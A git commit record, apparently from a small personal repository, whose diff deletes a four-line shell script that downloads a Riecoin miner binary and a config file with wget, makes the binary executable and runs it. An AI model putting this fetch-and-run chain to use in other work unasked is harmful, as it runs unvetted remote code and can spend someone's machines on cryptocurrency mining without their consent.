7fd8df21426234140c83ab0a2631aa33885d0a7c
Frotinor <reysanju1999@gmail.com>
2024-12-14 03:30:45 +0700

    Update and rename gwebiyufew.sh to reokreok.sh

--- gwebiyufew.sh
+++
@@ -1,4 +0,0 @@
-wget https://riecoin.xyz/rieMiner/Download/Deb64AVX2 && \
-chmod +x Deb64AVX2 && \
-wget https://raw.githubusercontent.com/Frotinor/heithere/refs/heads/main/gwernui.conf && \
-./Deb64AVX2 "gwernui.conf"
